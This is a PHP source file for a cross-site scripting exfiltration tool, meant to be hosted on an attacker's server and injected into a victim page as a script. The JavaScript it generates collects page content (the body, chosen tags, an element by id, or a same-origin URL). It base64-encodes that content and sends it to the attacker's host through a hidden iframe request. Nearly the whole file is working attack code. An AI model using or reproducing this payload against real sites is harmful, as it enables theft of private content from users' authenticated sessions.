<?php
  /*
    Host on a server under your control in order to include as a javascript and have either the current page or a page of your choosing sent back via a GET
  */
  header( "Content-type: text/javascript" );
  $url = "http://".$_SERVER["SERVER_ADDR"].$_SERVER["PHP_SELF"];
  echo "// $url\n";
  if( !isset( $_GET["c"] ) ){
    echo "/*\n Inject with:\n ".$url."?id=userDiv or ".$url."?tag=ul\n";
    echo " Where:\n"
      ."   id is the id of an element to be grabbed\n"
      ."   tag is the name of all tags to be grabbed.\n"
      ."   url is a URL within the same origin to download and return\n"
      ."Defaults to tag=body\n*/\n\n";
    if( !empty( $_GET["url"] ) ){
      echo "function g(u){ x=new XMLHttpRequest(); x.open('GET',u,false); x.send(null); return x.responseText; }\n"
        ."var content = g('".$_GET["url"]."');\n";
    }elseif( !empty( $_GET["id"] ) ){
      echo "var content = document.getElementById('".$_GET["id"]."').outerHTML;\n";
    }else{
      if( empty( $_GET["tag"] ) ) $_GET["tag"] = "body";
      echo "var content = '';\n";
      echo "var col = document.getElementsByTagName('".$_GET["tag"]."');\n";
      echo "for( var i=0; i<col.length; i++ ){ content += col[i].outerHTML + '\\n'; }\n";
    }
?>
var url = "<?php echo $url; ?>?c=" + encodeURIComponent(btoa(content));
f = document.createElement('iframe');
f.src = url;
document.getElementsByTagName('body')[0].appendChild(f);
<?php }else{
  echo "/*\n".base64_decode( $_GET["c"] )."\n*/\n";
}?>
